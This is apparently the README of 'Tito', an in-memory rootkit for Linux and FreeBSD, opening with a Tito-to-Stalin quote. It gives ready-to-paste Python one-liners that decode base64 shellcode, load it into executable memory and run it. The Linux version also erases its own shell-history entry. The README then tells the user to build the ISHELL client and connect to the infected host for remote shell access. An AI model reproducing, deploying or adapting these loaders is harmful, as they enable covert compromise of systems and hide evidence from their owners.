# Tito
An In-Memory Rootkit For Linux

<h2>From Tito to Stalin:</h2>

"Stop sending people to kill me. We’ve already captured five of them, one of them with a bomb and another with a rifle. If you don’t stop sending killers, I’ll send one to Moscow, and I won’t have to send a second."

You can run the entire rootkit from the Linux command-line like so:

```
python3 -c 'import base64, mmap, ctypes; encoded_shellcode = "SDHJSIHp9////0iNBe////9Iu6ajGtSlB5bkSDFYJ0gt+P///+L07hs1tsxpuZfOo4OE8VjEgs6OeYD7VX75pqMa+81o+4GJ03LnlnW5rfXrX5jpKuDUiJE1vdZv8uTw9E6KzzzO66OjGtSlB5bk"; shellcode = base64.b64decode(encoded_shellcode); mem = mmap.mmap(-1, len(shellcode), mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC); mem.write(shellcode); addr = ctypes.addressof(ctypes.c_char.from_buffer(mem)); shell_func = ctypes.CFUNCTYPE(None)(addr); print("... and I won’t have to send a second."); shell_func()' && history -d $(history | awk 'END { print $1 }')
```

With FreeBSD, it will depend on the version of python installed. If you have python3.11 you can just use this:

```
python3.11 -c 'import base64, mmap, ctypes; encoded_shellcode = "SDHJSIHp+P///0iNBe////9Iu67h2fdth+YDSDFYJ0gt+P///+L05tALH0+H5gOBibaaCKiWa53Sq9gZ7pJsgaiKvyjLqi7Y0ffEQu6Va8rhhqU6z2/l5tAZv+5P3Qyr4dn3bYfmAw=="; shellcode = base64.b64decode(encoded_shellcode); mem = mmap.mmap(-1, len(shellcode), mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC); mem.write(shellcode); addr = ctypes.addressof(ctypes.c_char.from_buffer(mem)); shell_func = ctypes.CFUNCTYPE(None)(addr); print("...and I will not have to send a second."); shell_func()' 2>/dev/null
``` 

From there you may go into the ISHELL-v0.3 folder and type 'make linux' or 'make bsd' to build ish. Then you may run ish with the ip of the device the rootkit was ran on to connect.

Currently tested on x86_64 Debian Trixie and FreeBSD 14.1
